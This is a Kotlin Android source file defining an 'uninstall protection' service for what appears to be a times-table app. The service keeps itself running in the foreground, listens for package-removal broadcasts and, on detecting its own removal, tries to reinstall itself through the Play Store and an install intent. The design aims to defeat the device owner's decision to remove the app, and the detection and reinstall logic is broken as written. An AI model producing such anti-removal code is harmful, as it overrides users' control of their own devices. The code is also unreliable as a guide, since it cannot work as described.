package com.example.oiaatabuada.managers

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.util.Log

class UninstallProtectionService : Service() {
    private val TAG = "UninstallProtectionService"
    private val CHANNEL_ID = "UninstallProtectionChannel"
    private val NOTIFICATION_ID = 1002

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForegroundService()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Proteção contra Desinstalação",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Protege o app contra desinstalação"
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Proteção Ativa")
                .setContentText("Protegendo contra desinstalação")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("Proteção Ativa")
                .setContentText("Protegendo contra desinstalação")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build()
        }

        startForeground(NOTIFICATION_ID, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Serviço de proteção parado")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val filter = IntentFilter(Intent.ACTION_PACKAGE_REMOVED)
        filter.addDataScheme("package")
        registerReceiver(uninstallReceiver, filter)

        return START_STICKY
    }

    private val uninstallReceiver: BroadcastReceiver? = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_PACKAGE_REMOVED) {
                val packageName = intent.data?.schemeSpecificPart
                if (packageName == context.packageName) {
                    reinstallApp()
                }
            }
        }
    }

    private fun reinstallApp() {
        try {
            Log.d(TAG, "Tentativa de desinstalação detectada! Reinstalando...")

            val intent = Intent(Intent.ACTION_VIEW).apply {
                data = android.net.Uri.parse("https://play.google.com/store/apps/details?id=${packageName}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }

            startActivity(intent)

            try {
                val apkUri = android.net.Uri.parse("package:${packageName}")
                val installIntent = Intent(Intent.ACTION_INSTALL_PACKAGE, apkUri)
                installIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(installIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao tentar reinstalar diretamente", e)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Erro ao tentar reinstalar app", e)
        }
    }
}